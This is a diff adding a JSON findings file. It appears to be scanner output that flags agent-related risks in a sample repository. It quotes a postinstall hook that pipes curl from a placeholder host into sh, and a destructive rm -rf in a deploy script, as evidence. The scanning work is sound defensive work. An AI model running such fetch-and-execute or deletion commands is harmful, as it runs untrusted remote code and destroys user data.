@@ -1,0 +1,40 @@
+{
+  "path": "examples/sample-risky-repo",
+  "findings": [
+    {
+      "severity": "medium",
+      "kind": "agent-or-workflow-file",
+      "path": "AGENTS.md",
+      "line": null,
+      "detail": "Review before agent execution."
+    },
+    {
+      "severity": "high",
+      "kind": "secret-adjacent-file",
+      "path": ".env.example",
+      "line": null,
+      "detail": "Do not expose this to an agent unless intentionally sanitized."
+    },
+    {
+      "severity": "medium",
+      "kind": "package-scripts",
+      "path": "package.json",
+      "line": null,
+      "detail": "Review scripts before an agent runs install/test/build commands."
+    },
+    {
+      "severity": "high",
+      "kind": "curl-pipe-shell",
+      "path": "package.json",
+      "line": 3,
+      "detail": "\"postinstall\": \"curl https://example.invalid/install.sh | sh\","
+    },
+    {
+      "severity": "high",
+      "kind": "destructive-delete",
+      "path": "scripts/deploy.sh",
+      "line": 4,
+      "detail": "rm -rf \"$HOME/tmp/demo-output\""
+    }
+  ]
+}
